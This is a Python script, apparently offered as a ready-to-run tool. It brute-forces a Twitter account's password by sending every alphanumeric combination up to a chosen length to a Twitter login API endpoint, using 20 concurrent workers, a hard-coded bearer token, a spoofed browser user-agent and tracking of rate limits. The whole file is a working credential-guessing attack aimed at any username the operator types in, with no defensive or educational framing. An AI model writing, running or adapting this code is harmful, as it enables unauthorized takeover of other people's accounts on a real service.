import asyncio
import aiohttp
import itertools
import string
import time
import json
import signal
import sys

HOST_API = "https://twitter.com/i/api/authentication/login"

CHARS = string.ascii_letters + string.digits
MAX_PASSWORD_LENGTH = 4

class TwitterBruteForcer:
    def __init__(self, username: str, max_length: int = 4):
        self.username = username
        self.max_length = max_length

        self.stats = {
            "attempts": 0,
            "invalid": 0,
            "success": 0,
            "rate_limited": 0,
            "errors": 0,
        }

        self.headers = {
            "Authorization": "Bearer AAAAAAAAAAAAAAAAAAAAAFQODgEAAAAAAw1i8yJ2UzG0S0xT7mH5kXvZ8sN9...",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "x-twitter-active-user": "yes",
            "x-twitter-auth-type": "OAuth2Session"
        }

    def password_generator(self):
        for length in range(1, self.max_length + 1):
            for p in itertools.product(CHARS, repeat=length):
                yield "".join(p), length

    async def try_password(self, session: aiohttp.ClientSession, password: str) -> bool:
        payload = {
            "grant_type": "password",
            "username_or_email": self.username,
            "password": password,
            "include_role": True
        }

        try:
            async with session.post(
                HOST_API,
                headers=self.headers,
                json=payload,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as response:

                self.stats["attempts"] += 1

                try:
                    data = await response.json(content_type=None)
                except Exception:
                    text_data = await response.text()
                    try:
                        data = json.loads(text_data)
                    except:
                        self.stats["errors"] += 1
                        return False

                if response.status == 200:
                    user_info = data.get("user")
                    error_msg = data.get("error")

                    if user_info and not error_msg:
                        self.stats["success"] += 1
                        return True
                    elif user_info and error_msg:
                        self.stats["invalid"] += 1
                elif response.status == 429:
                    self.stats["rate_limited"] += 1
                else:
                    self.stats["invalid"] += 1

        except asyncio.TimeoutError:
            self.stats["errors"] += 1
        except aiohttp.ClientError as e:
            self.stats["errors"] += 1
            print(f"Network Error: {e}")

        return False

    async def run(self):
        print(f"Target API      : {HOST_API}")
        print(f"Account         : @{self.username}")
        print(f"Max Password Len: {self.max_length}")
        print("-" * 30)

        start = time.monotonic()
        last_progress_time = start
        found_event = asyncio.Event()

        task_queue = asyncio.Queue(maxsize=100)

        num_workers = 20 
        workers = []

        async def worker(session):
            while not found_event.is_set():
                try:
                    item = await task_queue.get()

                    if item is None:
                        break

                    password, current_len = item

                    if found_event.is_set() and task_queue.empty():
                        break

                    is_success = await self.try_password(session, password)

                    if is_success:
                        found_event.set()

                    task_queue.task_done()

                except asyncio.CancelledError:
                    break
                except Exception as e:
                    print(f"Worker Error: {e}")

        async with aiohttp.ClientSession() as session:
            for _ in range(num_workers):
                w = asyncio.create_task(worker(session))
                workers.append(w)

            generator = self.password_generator()

            try:
                while not found_event.is_set():
                    try:
                        password, current_len = next(generator)
                        await task_queue.put((password, current_len))
                    except StopIteration:
                        break

                    now = time.monotonic()
                    if now - last_progress_time >= 1.0:
                        current_attempts = self.stats['attempts']
                        if not task_queue.empty():
                            try:
                                first_item = task_queue._queue[0]
                                _, len_val = first_item
                            except IndexError:
                                len_val = "..."
                            print(f"[PROGRESS] Trying length {len_val}, Attempts: {current_attempts}")
                        last_progress_time = now

                    if task_queue.full():
                        await asyncio.sleep(0.01)

                await task_queue.join()

                found_event.set() 

                await asyncio.gather(*workers, return_exceptions=True)

            except asyncio.CancelledError:
                pass

        elapsed = time.monotonic() - start

        print("-" * 30)
        if self.stats['success'] > 0:
            print("PASSWORD FOUND!")
        else:
            print("Password not found within range.")

        print(f"Attempts       : {self.stats['attempts']}")
        print(f"Invalid        : {self.stats['invalid']}")
        print(f"Rate Limited   : {self.stats['rate_limited']}")
        print(f"Errors         : {self.stats['errors']}")
        print(f"Time           : {elapsed:.2f}s")
        print("-" * 30)

async def main():
    username_input = input("Please enter Twitter Username (ID or Email): ").strip()
    if not username_input:
        username_input = "test_user"

    try:
        max_len_input = input(f"Enter max password length (default {MAX_PASSWORD_LENGTH}): ").strip()
        max_length = int(max_len_input) if max_len_input else MAX_PASSWORD_LENGTH
    except ValueError:
        max_length = MAX_PASSWORD_LENGTH

    brutor = TwitterBruteForcer(
        username=username_input,
        max_length=max_length
    )

    await brutor.run()

def signal_handler(sig, frame):
    print("\n\nKeyboard Interrupt! Stopping gracefully...")
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nProgram exited by user.")
